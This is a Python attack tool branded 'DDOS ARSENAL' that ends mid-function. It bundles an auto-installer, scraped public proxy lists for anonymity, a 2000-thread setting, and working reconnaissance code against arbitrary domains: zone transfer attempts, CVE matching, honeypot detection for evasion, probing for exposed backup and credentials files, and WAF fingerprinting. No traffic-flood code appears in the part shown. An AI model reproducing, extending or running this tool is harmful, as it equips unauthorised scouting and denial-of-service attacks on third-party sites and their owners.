#!/usr/bin/env python3
# ================================================================
# DDOS ARSENAL – ULTIMATE MAXIMUM v.1.0.0
# AUTHOR: @biblia007
# VERSION: 1.0.0
# STATUS: EXE READY - FULLY WORKING
# ================================================================

import os
import sys
import subprocess
import time
import threading
import socket
import random
import struct
import ssl
import json
import re
import hashlib
import base64
import ipaddress
import logging
import queue
import tempfile
import shutil
import gc
import platform
import signal
import traceback
import warnings
import zipfile
import tarfile
import gzip
import zlib
import bz2
import lzma
import csv
import io
import pickle
import sqlite3
import xml.etree.ElementTree as ET
import xml.dom.minidom
import html.parser
import html.entities
import urllib.parse
import urllib.request
import urllib.error
import http.client
import http.cookiejar
import email.parser
import email.utils
import mimetypes
import pathlib
import glob
import fnmatch
import fileinput
import linecache
import codecs
import string
import keyword
import tokenize
import ast
import dis
import marshal
import zipapp
from typing import List, Dict, Any, Optional, Tuple, Union, Callable, Iterator, Generator
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from collections import defaultdict, Counter, OrderedDict, deque, namedtuple
from datetime import datetime, timedelta, date, timezone
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode
import itertools
import functools
import operator
import math
import ctypes
import textwrap
import secrets
import string
import uuid
import inspect
import importlib
import pkgutil
try:
    import pkg_resources
except ImportError:
    pkg_resources = None
import json5

# ================================================================
# AUTO-INSTALLER
# ================================================================

ESSENTIAL_LIBRARIES = [
    'requests',
    'colorama',
    'dnspython',
    'python-whois',
    'tldextract',
    'pyOpenSSL',
    'cryptography',
    'urllib3',
    'certifi',
    'charset-normalizer',
    'idna',
    'six',
    'json5',
    'beautifulsoup4',
    'lxml',
    'html5lib',
    'geopy',
    'pytz',
    'tqdm',
    'rich',
    'prettytable',
    'tabulate',
    'termcolor',
    'click',
    'python-dotenv',
]

def auto_install_essentials():
    print("\n" + "="*80)
    print("   🔧 CHECKING AND INSTALLING ESSENTIAL LIBRARIES")
    print("="*80 + "\n")
    
    to_install = []
    for lib in ESSENTIAL_LIBRARIES:
        try:
            lib_import = lib.replace('-', '_')
            if lib_import == 'dnspython':
                __import__('dns')
            elif lib_import == 'python_whois':
                __import__('whois')
            elif lib_import == 'pyOpenSSL':
                __import__('OpenSSL')
            elif lib_import == 'beautifulsoup4':
                __import__('bs4')
            elif lib_import == 'python_dotenv':
                __import__('dotenv')
            else:
                __import__(lib_import)
            print(f"[✓] {lib}")
        except ImportError:
            to_install.append(lib)
            print(f"[✗] {lib} - MISSING")
    
    if to_install:
        print(f"\n[*] INSTALLING {len(to_install)} LIBRARIES...\n")
        for lib in to_install:
            try:
                pkg_map = {
                    'dnspython': 'dnspython',
                    'python-whois': 'python-whois',
                    'pyOpenSSL': 'pyOpenSSL',
                    'beautifulsoup4': 'beautifulsoup4',
                    'python-dotenv': 'python-dotenv',
                }
                pkg = pkg_map.get(lib, lib)
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'])
                print(f"[+] {lib} installed")
            except Exception as e:
                print(f"[-] Failed {lib}: {e}")
        print("\n[*] RESTARTING SCRIPT...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
    else:
        print("\n[*] ALL LIBRARIES INSTALLED!")
    print("="*80 + "\n")

auto_install_essentials()

# ================================================================
# IMPORTS
# ================================================================

import requests
import colorama
from colorama import init, Fore, Back, Style
import dns.resolver
import dns.reversename
import dns.query
import dns.zone
import whois
import tldextract
import OpenSSL
import cryptography
import urllib3
import certifi
import charset_normalizer
import idna
import six
import json5
from bs4 import BeautifulSoup
import lxml
import html5lib
import geopy
from geopy.geocoders import Nominatim
import geocoder
import pytz
import tzlocal
import dateutil
from dateutil import parser
import tqdm
from tqdm import tqdm
import rich
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.syntax import Syntax
from rich.markdown import Markdown
from rich.tree import Tree
from rich.layout import Layout
from rich.columns import Columns
from rich import box
import prettytable
import tabulate
import termcolor
import click
import dotenv
from dotenv import load_dotenv

init(autoreset=True)
console = Console()

# ================================================================
# GLOBAL CONFIGURATION
# ================================================================

AUTHOR = "@biblia007"
VERSION = "ULTIMATE MAXIMUM v.1.0.0"

CONFIG = {
    'max_threads': 2000,
    'timeout': 5,
    'max_retries': 3,
    'packet_size': 8192,
    'scan_ports': [20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017],
    'common_ports': [1, 7, 9, 13, 17, 19, 37, 42, 43, 49, 50, 67, 68, 69, 70, 79, 81, 88, 101, 102, 104, 106, 109, 111, 113, 115, 117, 119, 123, 135, 137, 138, 139, 143, 144, 146, 161, 162, 163, 164, 174, 177, 178, 179, 191, 194, 199, 201, 202, 204, 206, 209, 210, 211, 212, 213, 220, 222, 223, 242, 245, 256, 259, 262, 264, 265, 267, 269, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445],
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    ],
    'proxy_sources': [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxy-List/main/Proxies.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/proxy_list_http.txt",
    ],
    'subdomain_list': [
        'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
        'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
        'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn',
        'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile',
        'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp',
        'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 'download',
        'dns', 'piwik', 'stats', 'dashboard', 'portal', 'manage', 'start', 'info',
        'help', 'store', 'cdn', 'api', 'dev2', 'server', 'test2', 'app', 'apps',
        'gateway', 'proxy', 'backup', 'stage', 'staging', 'cloud', 'files',
        'upload', 'downloads', 'fonts', 'push', 'events', 'source', 'git',
        'jenkins', 'gitlab', 'jira', 'confluence', 'docs', 'internal',
        'intranet', 'extranet', 'partner', 'clients', 'customer', 'portal',
        'console', 'monitor', 'monitoring', 'status', 'health', 'metrics',
        'logs', 'audit', 'security', 'firewall', 'remote', 'access', 'auth',
        'login', 'signin', 'account', 'profile', 'settings', 'config', 'conf',
        'data', 'backup', 'restore', 'storage', 'database', 'db', 'cache',
        'redis', 'memcache', 'elastic', 'kibana', 'grafana', 'prometheus',
        'alertmanager', 'thanos', 'loki', 'tempo', 'mimir', 'cortex',
        'victoriametrics', 'clickhouse', 'kafka', 'zookeeper', 'rabbitmq',
        'activemq', 'nats', 'nsq', 'pulsar', 'hadoop', 'spark', 'flink',
        'storm', 'kinesis', 'firehose', 's3', 'minio', 'ceph', 'glusterfs',
        'nfs', 'smb', 'cifs', 'ftp', 'sftp', 'tftp', 'rsync', 'syncthing',
        'owncloud', 'nextcloud', 'seafile', 'mattermost', 'rocketchat',
        'slack', 'teams', 'discord', 'element', 'matrix', 'xmpp', 'jabber',
        'irc', 'mastodon', 'pleroma', 'friendica', 'hubzilla', 'diaspora',
        'gnusocial', 'misskey', 'calckey', 'peertube', 'funkwhale', 'castopod',
        'lemmy', 'kbin', 'pixelfed', 'bookwyrm', 'writefreely', 'plume',
        'governor', 'forgefed', 'webmention', 'micropub', 'indieauth',
    ]
}

# ================================================================
# LOGGING SYSTEM
# ================================================================

class Logger:
    def __init__(self):
        self.log_dir = 'logs'
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(self.log_dir, f'ddos_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
        self.error_file = os.path.join(self.log_dir, f'errors_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
        self.logger = logging.getLogger()
        self.logger.setLevel(logging.INFO)
        fh = logging.FileHandler(self.log_file)
        eh = logging.FileHandler(self.error_file)
        eh.setLevel(logging.ERROR)
        ch = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        fh.setFormatter(formatter)
        eh.setFormatter(formatter)
        ch.setFormatter(formatter)
        self.logger.addHandler(fh)
        self.logger.addHandler(eh)
        self.logger.addHandler(ch)
    
    def info(self, msg):
        self.logger.info(msg)
        console.print(f"[cyan]ℹ {msg}[/cyan]")
    
    def error(self, msg):
        self.logger.error(msg)
        console.print(f"[red]✗ {msg}[/red]")
    
    def success(self, msg):
        self.logger.info(msg)
        console.print(f"[green]✓ {msg}[/green]")
    
    def warning(self, msg):
        self.logger.warning(msg)
        console.print(f"[yellow]⚠ {msg}[/yellow]")
    
    def debug(self, msg):
        self.logger.debug(msg)
        console.print(f"[dim]🔍 {msg}[/dim]")

logger = Logger()

# ================================================================
# COLOR SCHEMES
# ================================================================

COLOR_SCHEMES = {
    'red': {'main': Fore.RED, 'bright': Fore.LIGHTRED_EX, 'dark': Fore.RED},
    'green': {'main': Fore.GREEN, 'bright': Fore.LIGHTGREEN_EX, 'dark': Fore.GREEN},
    'blue': {'main': Fore.BLUE, 'bright': Fore.LIGHTBLUE_EX, 'dark': Fore.BLUE},
    'cyan': {'main': Fore.CYAN, 'bright': Fore.LIGHTCYAN_EX, 'dark': Fore.CYAN},
    'magenta': {'main': Fore.MAGENTA, 'bright': Fore.LIGHTMAGENTA_EX, 'dark': Fore.MAGENTA},
    'yellow': {'main': Fore.YELLOW, 'bright': Fore.LIGHTYELLOW_EX, 'dark': Fore.YELLOW},
    'white': {'main': Fore.WHITE, 'bright': Fore.WHITE, 'dark': Fore.LIGHTBLACK_EX},
    'gray': {'main': Fore.LIGHTBLACK_EX, 'bright': Fore.WHITE, 'dark': Fore.LIGHTBLACK_EX},
    'purple': {'main': Fore.MAGENTA, 'bright': Fore.LIGHTMAGENTA_EX, 'dark': Fore.MAGENTA},
    'orange': {'main': Fore.LIGHTYELLOW_EX, 'bright': Fore.YELLOW, 'dark': Fore.LIGHTBLACK_EX},
    'pink': {'main': Fore.LIGHTMAGENTA_EX, 'bright': Fore.MAGENTA, 'dark': Fore.LIGHTMAGENTA_EX},
    'teal': {'main': Fore.LIGHTCYAN_EX, 'bright': Fore.CYAN, 'dark': Fore.LIGHTCYAN_EX},
}

CURRENT_SCHEME = 'red'

def C():
    return COLOR_SCHEMES[CURRENT_SCHEME]['main']

def B():
    return COLOR_SCHEMES[CURRENT_SCHEME]['bright']

def D():
    return COLOR_SCHEMES[CURRENT_SCHEME]['dark']

def set_color(name):
    global CURRENT_SCHEME
    if name in COLOR_SCHEMES:
        CURRENT_SCHEME = name
        return True
    return False

# ================================================================
# ASCII ART
# ================================================================

LOGO = r"""
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
"""

BANNER = r"""
   ▄████████  ▄█   ▄█          ▄████████ ████████▄     ▄████████ 
  ███    ███ ███  ███         ███    ███ ███   ▀███   ███    ███ 
  ███    █▀  ███▌ ███         ███    ███ ███    ███   ███    █▀  
  ███        ███▌ ███        ▄███▄▄▄▄██▀ ███    ███   ███        
▀███████████ ███▌ ███       ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ 
         ███ ███  ███         ███    ███ ███    ███          ███ 
   ▄█    ███ ███  ███▌    ▄   ███    ███ ███   ▄███    ▄█    ███ 
 ▄████████▀  █▀   █████▄▄██   ██████████ ████████▀   ▄████████▀  
"""

QUOTES = [
    "In the digital world there are no walls, only those who forgot to set a password.",
    "A hacker is one who sees code where others see walls.",
    "On the internet, no one knows you are code.",
    "The system does not fall from a blow, but from thousands of unnoticed requests.",
    "The best firewall is the one nobody knows about.",
    "Zero-day is not a bug, it is an invitation.",
    "Code does not lie, only those who do not read it lie.",
    "The scanner sees ports, the hacker sees opportunities.",
    "All information has a price - either bitcoins or time.",
    "Anonymity is not a right, it is a skill.",
    "The only secure system is one that is turned off.",
    "Every lock has a key, every system has a backdoor.",
    "In cybersecurity, paranoia is not a disease, it is a survival instinct.",
    "The best encryption is the one that makes attackers look for easier targets.",
    "A firewall is just a wall, and walls can be climbed.",
    "The internet is a playground for those who know the rules.",
    "Data is the new oil, and hackers are the new drillers.",
    "The cloud is just someone else's computer.",
    "Security is a myth, privacy is a myth, only data is real.",
    "The only way to be safe is to never be connected.",
    "Every system has a backdoor, you just need to find it.",
    "Trust is a vulnerability.",
    "The best defense is a good offense.",
    "Hackers are the immune system of the internet.",
]

# ================================================================
# UTILITY FUNCTIONS
# ================================================================

def get_terminal_size():
    try:
        return os.get_terminal_size().columns, os.get_terminal_size().lines
    except:
        return 120, 40

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_internet():
    try:
        requests.get('https://www.google.com', timeout=3)
        return True
    except:
        return False

def resolve_domain(domain):
    try:
        if '://' in domain:
            domain = urlparse(domain).hostname
        return socket.gethostbyname(domain)
    except:
        return None

def resolve_domain_all(domain):
    try:
        if '://' in domain:
            domain = urlparse(domain).hostname
        return socket.gethostbyname_ex(domain)
    except:
        return None

def get_random_ua():
    return random.choice(CONFIG['user_agents'])

def get_headers():
    return {
        'User-Agent': get_random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def get_random_port():
    return random.randint(1024, 65535)

def get_timestamp():
    return datetime.now().isoformat()

def get_date():
    return datetime.now().strftime("%Y-%m-%d")

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def get_datetime():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except:
        return False

def validate_domain(domain):
    pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    return re.match(pattern, domain) is not None

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def safe_print(msg, color=None, style=None):
    if color:
        console.print(color + msg + Style.RESET_ALL)
    elif style:
        console.print(style + msg + Style.RESET_ALL)
    else:
        console.print(msg)

def print_header(msg):
    console.print(Panel.fit(f"[bold cyan]{msg}[/bold cyan]", border_style="cyan"))

def print_success(msg):
    console.print(f"[green]✓ {msg}[/green]")

def print_error(msg):
    console.print(f"[red]✗ {msg}[/red]")

def print_warning(msg):
    console.print(f"[yellow]⚠ {msg}[/yellow]")

def print_info(msg):
    console.print(f"[cyan]ℹ {msg}[/cyan]")

def print_separator():
    console.print("[dim]" + "="*80 + "[/dim]")

def print_title(msg):
    console.print(f"\n[bold]{msg}[/bold]")
    console.print("[dim]" + "="*len(msg) + "[/dim]")

def truncate_string(s, length=100):
    if len(s) <= length:
        return s
    return s[:length] + "..."

def safe_json_loads(data):
    try:
        return json.loads(data)
    except:
        return None

def safe_json_dumps(data):
    try:
        return json.dumps(data, indent=2, default=str)
    except:
        return str(data)

def chunk_list(lst, size):
    for i in range(0, len(lst), size):
        yield lst[i:i + size]

def flatten_list(lst):
    result = []
    for item in lst:
        if isinstance(item, list):
            result.extend(flatten_list(item))
        else:
            result.append(item)
    return result

def unique_list(lst):
    return list(dict.fromkeys(lst))

def count_occurrences(lst):
    return Counter(lst)

def get_file_size(path):
    try:
        return os.path.getsize(path)
    except:
        return 0

def get_file_extension(path):
    return os.path.splitext(path)[1].lower()

def get_file_name(path):
    return os.path.basename(path)

def get_directory_name(path):
    return os.path.dirname(path)

def ensure_directory(path):
    os.makedirs(path, exist_ok=True)

def delete_file(path):
    try:
        os.remove(path)
        return True
    except:
        return False

def read_file(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read()
    except:
        return None

def write_file(path, content):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        return True
    except:
        return False

def append_file(path, content):
    try:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content)
        return True
    except:
        return False

def read_json_file(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return None

def write_json_file(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
        return True
    except:
        return False

def calculate_hash(data, algo='sha256'):
    if algo == 'md5':
        return hashlib.md5(data.encode()).hexdigest()
    elif algo == 'sha1':
        return hashlib.sha1(data.encode()).hexdigest()
    elif algo == 'sha256':
        return hashlib.sha256(data.encode()).hexdigest()
    elif algo == 'sha512':
        return hashlib.sha512(data.encode()).hexdigest()
    return None

def base64_encode(data):
    return base64.b64encode(data.encode()).decode()

def base64_decode(data):
    return base64.b64decode(data).decode()

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def is_port_open(ip, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip')
    except:
        return None

def get_geo_ip(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def get_dns_records(domain, record_type='A'):
    try:
        answers = dns.resolver.resolve(domain, record_type)
        return [str(r) for r in answers]
    except:
        return []

def get_all_dns_records(domain):
    records = {}
    for r in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'SRV', 'PTR', 'CAA', 'DS', 'DNSKEY']:
        records[r] = get_dns_records(domain, r)
    return records

def get_reverse_dns(ip):
    try:
        rev_name = dns.reversename.from_address(ip)
        answers = dns.resolver.resolve(rev_name, 'PTR')
        return str(answers[0])
    except:
        return None

def get_whois(domain):
    try:
        w = whois.whois(domain)
        return {
            'domain_name': w.domain_name,
            'registrar': w.registrar,
            'whois_server': w.whois_server,
            'creation_date': str(w.creation_date),
            'expiration_date': str(w.expiration_date),
            'updated_date': str(w.updated_date),
            'name_servers': w.name_servers,
            'status': w.status,
            'emails': w.emails,
            'dnssec': w.dnssec,
        }
    except:
        return None

def get_ssl_certificate(domain, port=443):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                return {
                    'subject': dict(x[0] for x in cert['subject']),
                    'issuer': dict(x[0] for x in cert['issuer']),
                    'notBefore': cert['notBefore'],
                    'notAfter': cert['notAfter'],
                    'serialNumber': cert['serialNumber'],
                    'version': cert.get('version', 'Unknown'),
                    'subjectAltName': cert.get('subjectAltName', []),
                }
    except:
        return None

def get_http_headers(url):
    try:
        response = requests.head(url, timeout=5, headers=get_headers())
        return dict(response.headers)
    except:
        return None

def get_http_status(url):
    try:
        response = requests.get(url, timeout=5, headers=get_headers())
        return response.status_code
    except:
        return None

def get_page_title(url):
    try:
        response = requests.get(url, timeout=5, headers=get_headers())
        match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
        return match.group(1) if match else None
    except:
        return None

def extract_emails(text):
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    return list(set(re.findall(pattern, text)))

def extract_urls(text):
    pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
    return list(set(re.findall(pattern, text)))

def extract_domains(text):
    pattern = r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}'
    return list(set(re.findall(pattern, text)))

def extract_ips(text):
    pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    return list(set(re.findall(pattern, text)))

def is_cloudflare(domain):
    try:
        response = requests.get(f'http://{domain}', timeout=5, headers=get_headers())
        server = response.headers.get('Server', '').lower()
        return 'cloudflare' in server or 'cf-ray' in response.headers
    except:
        return False

def get_server_software(domain):
    try:
        response = requests.get(f'http://{domain}', timeout=5, headers=get_headers())
        return response.headers.get('Server', 'Unknown')
    except:
        return 'Unknown'

def get_technology_stack(domain):
    techs = []
    try:
        response = requests.get(f'http://{domain}', timeout=5, headers=get_headers())
        html = response.text.lower()
        if 'jquery' in html:
            techs.append('jQuery')
        if 'bootstrap' in html:
            techs.append('Bootstrap')
        if 'react' in html:
            techs.append('React')
        if 'angular' in html:
            techs.append('Angular')
        if 'vue' in html:
            techs.append('Vue.js')
        if 'wordpress' in html:
            techs.append('WordPress')
        if 'drupal' in html:
            techs.append('Drupal')
        if 'joomla' in html:
            techs.append('Joomla')
        if 'laravel' in html:
            techs.append('Laravel')
        if 'django' in html:
            techs.append('Django')
        if 'flask' in html:
            techs.append('Flask')
        if 'nginx' in html:
            techs.append('Nginx')
        if 'apache' in html:
            techs.append('Apache')
        if 'cloudflare' in html:
            techs.append('Cloudflare')
        if 'php' in html:
            techs.append('PHP')
        if 'python' in html:
            techs.append('Python')
        if 'ruby' in html:
            techs.append('Ruby')
        if 'node' in html or 'nodejs' in html:
            techs.append('Node.js')
        if 'go' in html:
            techs.append('Go')
    except:
        pass
    return list(set(techs))

def framework_detector(domain):
    """Detect common frameworks for a domain. Wrapper around get_technology_stack
    kept for backward compatibility with older code that expects a separate
    framework_detector function."""
    try:
        techs = get_technology_stack(domain)
        # Map technologies to framework names if needed
        frameworks = []
        mapping = {
            'django': 'Django',
            'flask': 'Flask',
            'laravel': 'Laravel',
            'react': 'React',
            'angular': 'Angular',
            'vue': 'Vue.js',
            'wordpress': 'WordPress',
            'drupal': 'Drupal',
            'joomla': 'Joomla',
            'node.js': 'Node.js',
            'php': 'PHP',
        }
        for t in techs:
            tl = t.lower()
            for key, val in mapping.items():
                if key in tl:
                    frameworks.append(val)
        # include any techs not covered by mapping
        for t in techs:
            if t not in frameworks:
                frameworks.append(t)
        return list(OrderedDict.fromkeys(frameworks))
    except:
        return []

# ================================================================
# DNS Zone Transfer Scanner
# ================================================================

def dns_zone_transfer(domain):
    logger.info(f"Attempting DNS zone transfer for {domain}")
    try:
        ns = dns.resolver.resolve(domain, 'NS')
        for ns_record in ns:
            ns_name = str(ns_record)
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns_name, domain))
                if zone:
                    logger.success(f"Zone transfer successful from {ns_name}")
                    return {str(name): [str(r) for r in node.rdataset] for name, node in zone.nodes.items()}
            except:
                pass
    except:
        pass
    logger.warning("Zone transfer failed (likely secured)")
    return None

# ================================================================
# CVE Scanner
# ================================================================

def cve_scanner(domain):
    logger.info(f"Checking CVEs for {domain}")
    results = []
    common_vulns = {
        'wordpress': ['CVE-2023-5360', 'CVE-2023-2745', 'CVE-2022-4230'],
        'apache': ['CVE-2023-45802', 'CVE-2023-25690', 'CVE-2022-37436'],
        'nginx': ['CVE-2023-44487', 'CVE-2023-37252', 'CVE-2022-41742'],
        'php': ['CVE-2023-3824', 'CVE-2023-0662', 'CVE-2022-31629'],
        'django': ['CVE-2023-36053', 'CVE-2023-31047', 'CVE-2022-34265'],
        'laravel': ['CVE-2023-29297', 'CVE-2022-30778', 'CVE-2021-43503'],
    }
    techs = get_technology_stack(domain)
    for tech in techs:
        tech_lower = tech.lower()
        for key, vulns in common_vulns.items():
            if key in tech_lower:
                results.extend(vulns)
    return list(set(results))

# ================================================================
# Honeypot Detector
# ================================================================

def honeypot_detector(ip):
    logger.info(f"Checking if {ip} is a honeypot...")
    indicators = []
    honeypot_ports = [22, 23, 25, 80, 443, 1433, 3306, 3389, 5900, 8080, 8443]
    for port in honeypot_ports:
        if is_port_open(ip, port, timeout=0.5):
            indicators.append(f"Port {port} open")
    try:
        response = requests.get(f'http://{ip}', timeout=2)
        if 'honeypot' in response.text.lower():
            indicators.append("Honeypot string in response")
        if 'trap' in response.text.lower():
            indicators.append("Trap string in response")
    except:
        pass
    return {'is_honeypot': len(indicators) > 3, 'indicators': indicators}

# ================================================================
# Backup File Scanner
# ================================================================

def backup_scanner(domain):
    logger.info(f"Scanning for backup files on {domain}")
    backups = []
    common_backups = [
        'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.db',
        'wp-config.php.bak', 'config.php.bak', 'settings.py.bak',
        'db.sqlite3.bak', 'dump.sql', 'database.sql',
        'old_backup.zip', 'backup_old.tar.gz', 'site_backup.zip',
        'backup.tgz', 'data_backup.sql', 'config_backup.ini',
        'settings_backup.json', 'credentials_backup.txt',
    ]
    for backup in common_backups:
        try:
            url = f"http://{domain}/{backup}"
            response = requests.head(url, timeout=2)
            if response.status_code == 200:
                backups.append({'file': backup, 'size': response.headers.get('Content-Length', 'Unknown')})
                logger.success(f"Found backup: {backup}")
        except:
            pass
    return backups

# ================================================================
# Cookie Analyzer
# ================================================================

def cookie_analyzer(domain):
    logger.info(f"Analyzing cookies for {domain}")
    results = {}
    try:
        response = requests.get(f'http://{domain}', headers=get_headers())
        for cookie in response.cookies:
            cookie_info = {
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('httponly'),
                'samesite': cookie.get_nonstandard_attr('samesite', 'None'),
                'path': cookie.path,
                'domain': cookie.domain,
            }
            results[cookie.name] = cookie_info
    except:
        pass
    return results

# ================================================================
# WAF Detector
# ================================================================

def waf_detector(domain):
    logger.info(f"Detecting WAF for {domain}")
    waf_signatures = {
        'Cloudflare': ['cf-ray', 'cloudflare'],
        'AWS WAF': ['x-amzn-RequestId', 'aws'],
        'Akamai': ['akamai', 'x-akamai'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'ModSecurity': ['mod_security', 'modsecurity'],
        'Imperva': ['incapsula', 'x-iinfo'],
        'F5': ['bigip', 'f5'],
    }
    detected = []
    try:
        response = requests.get(f'http://{domain}', timeout=5)
        headers = response.headers
        for waf, signatures in waf_signatures.items():
